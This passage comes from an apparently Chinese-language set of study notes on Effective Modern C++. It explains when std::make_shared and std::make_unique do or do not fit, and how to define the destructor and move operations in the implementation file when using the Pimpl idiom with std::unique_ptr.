class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;Widget&gt; <span class="hljs-title">spw</span><span class="hljs-params">(<span class="hljs-keyword">new</span> Widget)</span></span>;<br></code></pre></div></td></tr></table></figure><p>显然，这段代码需要进行内存分配，但它实际上执行了两次。</p><p>每个<code>std::shared_ptr</code>指向一个控制块，其中包含被指向对象的引用计数，还有其他东西。这个控制块的内存在<code>std::shared_ptr</code>构造函数中分配。因此，直接使用<code>new</code>需要为<code>Widget</code>进行一次内存分配，为控制块再进行一次内存分配。</p><p>如果使用<code>std::make_shared</code>代替：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">auto</span> spw = <span class="hljs-built_in">std</span>::make_shared&lt;Widget&gt;();<br></code></pre></div></td></tr></table></figure><p>一次分配足矣。这是因为<code>std::make_shared</code>分配一块内存，同时容纳了<code>Widget</code>对象和控制块。这种优化减少了程序的静态大小，因为代码只包含一个内存分配调用，并且它提高了可执行代码的速度，因为内存只分配一次。此外，使用<code>std::make_shared</code>避免了对控制块中的某些簿记信息的需要，潜在地减少了程序的总内存占用。</p><h3><span id="不使用stdmake_shared-的情况">不使用<code>std::make_shared</code> 的情况</span></h3><h4><span id="需要自定义删除器时">需要自定义删除器时</span></h4><p><code>make</code>函数都不允许指定自定义删除器，但是<code>std::unique_ptr</code>和<code>std::shared_ptr</code>有构造函数这么做。有个<code>Widget</code>的自定义删除器：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> widgetDeleter = [](Widget* pw) &#123; … &#125;;<br></code></pre></div></td></tr></table></figure><p>创建一个使用它的智能指针只能直接使用<code>new</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;Widget, <span class="hljs-keyword">decltype</span>(widgetDeleter)&gt;<br>    upw(<span class="hljs-keyword">new</span> Widget, widgetDeleter);<br><br><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;Widget&gt; <span class="hljs-title">spw</span><span class="hljs-params">(<span class="hljs-keyword">new</span> Widget, widgetDeleter)</span></span>;<br></code></pre></div></td></tr></table></figure><p>对于<code>make</code>函数，没有办法做同样的事情。</p><h4><span id="不支持花括号调用stdinitializer_list">不支持花括号调用<code>std::initializer_list</code></span></h4><p>常规的用花括号创建的对象更倾向于使用<code>std::initializer_list</code>作为形参的重载形式，而用小括号创建对象将调用不用<code>std::initializer_list</code>作为参数的的重载形式。</p><p>但是，在这些调用中，</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> upv = <span class="hljs-built_in">std</span>::make_unique&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;&gt;(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>);<br><span class="hljs-keyword">auto</span> spv = <span class="hljs-built_in">std</span>::make_shared&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;&gt;(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>);<br></code></pre></div></td></tr></table></figure><p>生成的智能指针指向带有10个元素的<code>std::vector</code>，每个元素值为20。</p><p>如果你想用花括号初始化指向的对象，你必须直接使用<code>new</code>。</p><p>一个变通的方法：使用<code>auto</code>类型推导从花括号初始化创建<code>std::initializer_list</code>对象，然后将<code>auto</code>创建的对象传递给<code>make</code>函数。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">//创建std::initializer_list</span><br><span class="hljs-keyword">auto</span> initList = &#123; <span class="hljs-number">10</span>, <span class="hljs-number">20</span> &#125;;<br><span class="hljs-comment">//使用std::initializer_list为形参的构造函数创建std::vector</span><br><span class="hljs-keyword">auto</span> spv = <span class="hljs-built_in">std</span>::make_shared&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;&gt;(initList);<br></code></pre></div></td></tr></table></figure><p>对于<code>std::unique_ptr</code>，只有这两种情景（自定义删除器和花括号初始化）使用<code>make</code>函数有点问题。对于<code>std::shared_ptr</code>和它的<code>make</code>函数，还有2个问题。都属于边缘情况，但是一些开发者常碰到。</p><h4><span id="类重载了operator-new和operator-delete">类重载了<code>operator new</code>和<code>operator delete</code></span></h4><p>例如，<code>Widget</code>类的<code>operator new</code>和<code>operator delete</code>只会处理<code>sizeof(Widget)</code>大小的内存块的分配和释放。因为<code>std::allocate_shared</code>需要的内存总大小不等于动态分配的对象大小，还需要<strong>再加上</strong>控制块大小。</p><p>与直接使用<code>new</code>相比，<code>std::make_shared</code>在大小和速度上的优势源于<code>std::shared_ptr</code>的控制块与指向的对象放在同一块内存中。当对象的引用计数降为0，对象被销毁（即析构函数被调用）。但是，因为控制块和对象被放在同一块分配的内存块中，直到控制块的内存也被销毁，对象占用的内存才被释放。</p><p>控制块除了引用计数，还包含簿记信息。引用计数追踪有多少<code>std::shared_ptr</code>s指向控制块，但控制块还有第二个计数，记录多少个<code>std::weak_ptr</code>s指向控制块。第二个引用计数就是<em>weakcount</em>。当一个<code>std::weak_ptr</code>检测它是否过期时，它会检测指向的控制块中的引用计数（而不是<em>weakcount</em>）。</p><p>如果引用计数是0（即对象没有<code>std::shared_ptr</code>再指向它，已经被销毁了），<code>std::weak_ptr</code>就已经过期。</p><p>但是只要<code>std::weak_ptr</code>s引用一个控制块（即<em>weakcount</em>大于零），该控制块必须继续存在。只要控制块存在，包含它的内存就必须保持分配。</p><p>所以，通过<code>std::shared_ptr</code>的<code>make</code>函数分配的内存，直到最后一个<code>std::shared_ptr</code>和最后一个指向它的<code>std::weak_ptr</code>已被销毁，才会释放。</p><p>所以，如果对象类型非常大，而且销毁最后一个<code>std::shared_ptr</code>和销毁最后一个<code>std::weak_ptr</code>之间的时间很长，那么在销毁对象和释放它所占用的内存之间可能会出现延迟。</p><p>例如，下面这种情况，明显，直接只用<code>new</code>，对象的释放会立即执行。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReallyBigType</span> &#123;</span> … &#125;;<br><br><span class="hljs-keyword">auto</span> pBigObj =                          <span class="hljs-comment">//通过std::make_shared</span><br>    <span class="hljs-built_in">std</span>::make_shared&lt;ReallyBigType&gt;();  <span class="hljs-comment">//创建一个大对象</span><br>                    <br>…           <span class="hljs-comment">//创建std::shared_ptrs和std::weak_ptrs</span><br>            <span class="hljs-comment">//指向这个对象，使用它们</span><br><br>…           <span class="hljs-comment">//最后一个std::shared_ptr在这销毁，</span><br>            <span class="hljs-comment">//但std::weak_ptrs还在</span><br><br>…           <span class="hljs-comment">//在这个阶段，原来分配给大对象的内存还分配着</span><br><br>…           <span class="hljs-comment">//最后一个std::weak_ptr在这里销毁；</span><br>            <span class="hljs-comment">//控制块和对象的内存被释放</span><br></code></pre></div></td></tr></table></figure><p>直接只用<code>new</code>，一旦最后一个<code>std::shared_ptr</code>被销毁，<code>ReallyBigType</code>对象的内存就会被释放：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReallyBigType</span> &#123;</span> … &#125;;              <span class="hljs-comment">//和之前一样</span><br><br><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;ReallyBigType&gt; <span class="hljs-title">pBigObj</span><span class="hljs-params">(<span class="hljs-keyword">new</span> ReallyBigType)</span></span>;<br>                                        <span class="hljs-comment">//通过new创建大对象</span><br><br>…           <span class="hljs-comment">//像之前一样，创建std::shared_ptrs和std::weak_ptrs</span><br>            <span class="hljs-comment">//指向这个对象，使用它们</span><br>            <br>…           <span class="hljs-comment">//最后一个std::shared_ptr在这销毁,</span><br>            <span class="hljs-comment">//但std::weak_ptrs还在；</span><br>            <span class="hljs-comment">//对象的内存被释放</span><br><br>…           <span class="hljs-comment">//在这阶段，只有控制块的内存仍然保持分配</span><br><br>…           <span class="hljs-comment">//最后一个std::weak_ptr在这里销毁；</span><br>            <span class="hljs-comment">//控制块内存被释放</span><br></code></pre></div></td></tr></table></figure><h3><span id="一个优化的例子">一个优化的例子</span></h3><p>考虑前面的 <code>processWidget</code>函数，现在我们指定一个自定义删除器:</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">processWidget</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;Widget&gt; spw,     <span class="hljs-comment">//和之前一样</span></span></span><br><span class="hljs-function"><span class="hljs-params">                   <span class="hljs-keyword">int</span> priority)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">cusDel</span><span class="hljs-params">(Widget *ptr)</span></span>;                           <span class="hljs-comment">//自定义删除器</span><br></code></pre></div></td></tr></table></figure><p>下面这个是非异常安全的调用：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">processWidget(     <span class="hljs-comment">//和之前一样，</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;Widget&gt;(<span class="hljs-keyword">new</span> Widget, cusDel),    <span class="hljs-comment">//潜在的内存泄漏！</span><br>    computePriority() <br>);<br></code></pre></div></td></tr></table></figure><p>还是实参调用的顺序问题。</p><p>一个优化方式如下：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;Widget&gt; <span class="hljs-title">spw</span><span class="hljs-params">(<span class="hljs-keyword">new</span> Widget, cusDel)</span></span>;<br>processWidget(spw, computePriority());  <span class="hljs-comment">// 正确，但是没优化，见下</span><br></code></pre></div></td></tr></table></figure><p>但是有一个性能问题，实参在前一个非异常安全调用中，<code>std::shared_ptr</code>形参是传值，从右值构造只需要移动。</p><p>而优化后，传递左值构造需要拷贝。对<code>std::shared_ptr</code>而言，这种区别是有意义的，因为拷贝<code>std::shared_ptr</code>需要对引用计数原子递增，移动则不需要对引用计数有操作。</p><p>所以，更高效安全的版本是：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">processWidget(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">move</span>(spw), computePriority());   <span class="hljs-comment">//高效且异常安全</span><br></code></pre></div></td></tr></table></figure><h3><span id="结论">结论</span></h3><ul><li>和直接使用<code>new</code>相比，<code>make</code>函数消除了代码重复，提高了异常安全性。对于<code>std::make_shared</code>和<code>std::allocate_shared</code>，生成的代码更小更快。</li><li>不适合使用<code>make</code>函数的情况包括需要指定自定义删除器和希望用花括号初始化。</li><li>对于<code>std::shared_ptr</code>s，其他不建议使用<code>make</code>函数的情况包括：(1)有自定义内存管理的类；(2)特别关注内存的系统，非常大的对象，以及<code>std::weak_ptr</code>s比对应的<code>std::shared_ptr</code>s活得更久。</li></ul><h2><span id="22-当使用pimpl-idiom请在实现文件中定义特殊成员函数">22 当使用Pimpl Idiom，请在实现文件中定义特殊成员函数</span></h2><p>Pimpl Idiom将类数据成员替换成一个指向包含具体实现的类（implementationclass）（或结构体）的指针，并将原本放在主类（primaryclass）的相关数据成员们移动到实现类（implementationclass）去，而这些数据成员的访问将通过指针间接访问。</p><p>举个例子：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function">class <span class="hljs-title">Widget</span><span class="hljs-params">()</span> </span>&#123;                    <span class="hljs-comment">//定义在头文件“widget.h”</span><br><span class="hljs-keyword">public</span>:<br>    Widget();<br>    …<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> name;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">double</span>&gt; data;<br>    Gadget g1, g2, g3;              <span class="hljs-comment">//Gadget是用户自定义的类型</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>因为类<code>Widget</code>的数据成员包含有类型<code>std::string</code>，<code>std::vector</code>和<code>Gadget</code>，定义有这些类型的头文件在类<code>Widget</code>编译的时候，必须被包含进来，这意味着类<code>Widget</code>的使用者必须要<code>#include &lt;string&gt;</code>，<code>&lt;vector&gt;</code>以及<code>gadget.h</code>。</p><p>这些头文件将会增加类<code>Widget</code>使用者的编译时间，并且让这些使用者依赖于这些头文件。如果一个头文件的内容变了，类<code>Widget</code>使用者也必须要重新编译。标准库文件<code>&lt;string&gt;</code>和<code>&lt;vector&gt;</code>不是很常变，但是<code>gadget.h</code>可能会经常修订。</p><p>在C++98中使用Pimpl惯用法，可以把<code>Widget</code>的数据成员替换成一个原始指针，指向一个已经被声明过却还未被定义的结构体:</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span>                        //仍然在“<span class="hljs-title">widget</span>.<span class="hljs-title">h</span>”中</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>    Widget();<br>    ~Widget();                      <br>    …<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Impl</span>;</span>                    <span class="hljs-comment">//声明一个 实现结构体</span><br>    Impl *pImpl;                    <span class="hljs-comment">//以及指向它的指针</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>因为类<code>Widget</code>不再提到类型<code>std::string</code>，<code>std::vector</code>以及<code>Gadget</code>，<code>Widget</code>的使用者不再需要为了这些类型而引入头文件。这可以加速编译，并且意味着，如果这些头文件中有所变动，<code>Widget</code>的使用者不会受到影响。</p><p>一个已经被声明，却还未被实现的类型，被称为<strong>未完成类型</strong>（<em>incompletetype</em>）。 <code>Widget::Impl</code>就是这种类型。</p><p>下一步是对 实现类（implementation class） 的内存管理：</p><p>在<code>Widget.cpp</code>里:</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"widget.h"</span>             <span class="hljs-comment">//以下代码均在实现文件“widget.cpp”里</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"gadget.h"</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Widget</span>:</span>:Impl &#123;           <span class="hljs-comment">//含有之前在Widget中的数据成员的</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> name;           <span class="hljs-comment">//Widget::Impl类型的定义</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">double</span>&gt; data;<br>    Gadget g1,g2,g3;<br>&#125;;<br><br>Widget::Widget()                <span class="hljs-comment">//为此Widget对象分配数据成员</span><br>: pImpl(<span class="hljs-keyword">new</span> Impl)<br>&#123;&#125;<br><br>Widget::~Widget()               <span class="hljs-comment">//销毁数据成员</span><br>&#123; <span class="hljs-keyword">delete</span> pImpl; &#125;<br></code></pre></div></td></tr></table></figure><p>它使用了原始指针，原始的<code>new</code>和原始的<code>delete</code>，一切都让它如此的...原始。</p><h3><span id="使用智能指针">使用智能指针</span></h3><p>如果我们想要的只是在类<code>Widget</code>的构造函数动态分配<code>Widget::impl</code>对象，在<code>Widget</code>对象销毁时一并销毁它，<code>std::unique_ptr</code>是最合适的工具。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span> &#123;</span>                      <span class="hljs-comment">//在“widget.h”中</span><br><span class="hljs-keyword">public</span>:<br>    Widget();<br>    …<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Impl</span>;</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;Impl&gt; pImpl;    <span class="hljs-comment">//使用智能指针而不是原始指针</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>实现文件也可以改成如下：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"widget.h"</span>                 <span class="hljs-comment">//在“widget.cpp”中</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"gadget.h"</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Widget</span>:</span>:Impl &#123;               <span class="hljs-comment">//跟之前一样</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> name;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">double</span>&gt; data;<br>    Gadget g1,g2,g3;<br>&#125;;<br><br>Widget::Widget()                    <br>: pImpl(<span class="hljs-built_in">std</span>::make_unique&lt;Impl&gt;()) <br>&#123;&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="问题出现了">问题出现了</span></h3><p>以上的代码能编译，但是，最普通的<code>Widget</code>用法却会导致编译出错：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"widget.h"</span></span><br><br>Widget w;                           <span class="hljs-comment">//错误！</span><br></code></pre></div></td></tr></table></figure><p>在对象<code>w</code>被析构时（例如离开了作用域），问题出现了。</p><p>在这个时候，它的析构函数被调用。我们在类的定义里使用了<code>std::unique_ptr</code>，所以我们没有声明析构函数。编译器会自动为我们生成一个析构函数。在这个析构函数里，编译器会插入一些代码来调用类<code>Widget</code>的数据成员<code>pImpl</code>的析构函数。</p><p>问题就在于，此时<code>pImpl</code>的析构函数调用默认的删除器。默认删除器是一个函数，它使用<code>delete</code>来销毁内置于<code>std::unique_ptr</code>的原始指针。然而，在使用<code>delete</code>之前，通常会使默认删除器使用C++11的特性<code>static_assert</code>来确保原始指针指向的类型不是一个未完成类型。</p><p>需要确保在编译器生成销毁<code>std::unique_ptr&lt;Widget::Impl&gt;</code>的代码之前，<code>Widget::Impl</code>已经是一个完成类型（<em>complete type</em>）。当编译器“看到”它的定义的时候，该类型就成为完成类型了。 但是<code>Widget::Impl</code>的定义在<code>widget.cpp</code>里。</p><p>成功编译的关键，就是在<code>widget.cpp</code>文件内，让编译器在“看到”<code>Widget</code>的析构函数实现之前（也即编译器插入的，用来销毁<code>std::unique_ptr</code>这个数据成员的代码段之前），先定义<code>Widget::Impl</code>。</p><p>修改方法就是，在<code>widget.h</code>里只声明类<code>Widget</code>的析构函数，但不要在这里定义它：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span> &#123;</span>                  <span class="hljs-comment">//跟之前一样，在“widget.h”中</span><br><span class="hljs-keyword">public</span>:<br>    Widget();<br>    ~Widget();                  <span class="hljs-comment">//只有声明语句</span><br>    …<br><br><span class="hljs-keyword">private</span>:                        <span class="hljs-comment">//跟之前一样</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Impl</span>;</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;Impl&gt; pImpl;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>在<code>widget.cpp</code>文件中，在结构体<code>Widget::Impl</code>被定义之后，再定义析构函数：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"widget.h"</span>                 <span class="hljs-comment">//跟之前一样，在“widget.cpp”中</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"gadget.h"</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><br><span class="hljs-comment">// 先于析构函数定义</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Widget</span>:</span>:Impl &#123;               <span class="hljs-comment">//跟之前一样，定义Widget::Impl</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> name;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">double</span>&gt; data;<br>    Gadget g1,g2,g3;<br>&#125;<br><br>Widget::Widget()                    <span class="hljs-comment">//跟之前一样</span><br>: pImpl(<span class="hljs-built_in">std</span>::make_unique&lt;Impl&gt;())<br>&#123;&#125;<br><br>Widget::~Widget()                   <span class="hljs-comment">//析构函数的定义</span><br>&#123;&#125;<br></code></pre></div></td></tr></table></figure><p>如果你想强调编译器自动生成的析构函数会做和你一样正确的事情，你可以直接使用“<code>= default</code>”定义析构函数体</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">Widget::~Widget() = <span class="hljs-keyword">default</span>;        <span class="hljs-comment">//同上述代码效果一致</span><br></code></pre></div></td></tr></table></figure><h3><span id="移动">移动</span></h3><p>编译器自动生成的移动操作对其中的<code>std::unique_ptr</code>进行移动。但是，声明一个类<code>Widget</code>的析构函数会阻止编译器生成移动操作，所以你需要这样做：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span> &#123;</span>                                  <span class="hljs-comment">//仍然在“widget.h”中</span><br><span class="hljs-keyword">public</span>:<br>    Widget();<br>    ~Widget();<br><br>    Widget(Widget&amp;&amp; rhs) = <span class="hljs-keyword">default</span>;             <span class="hljs-comment">//思路正确，</span><br>    Widget&amp; <span class="hljs-keyword">operator</span>=(Widget&amp;&amp; rhs) = <span class="hljs-keyword">default</span>;  <span class="hljs-comment">//但代码错误</span><br>    …<br><br><span class="hljs-keyword">private</span>:                                        <span class="hljs-comment">//跟之前一样</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Impl</span>;</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;Impl&gt; pImpl;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>问题在于：</p><p>编译器生成的移动赋值操作符，在重新赋值之前，需要先销毁指针<code>pImpl</code>指向的对象。然而在<code>Widget</code>的头文件里，<code>pImpl</code>指针指向的是一个未完成类型。</p><p>移动构造函数的情况有所不同。移动构造函数的问题是编译器自动生成的代码里，包含有抛出异常的事件，在这个事件里会生成销毁<code>pImpl</code>的代码。</p><p>这些都需要，<code>Impl</code>是一个完成类型。</p><p>解决方法：</p><p>把移动操作的定义移动到实现文件里</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span 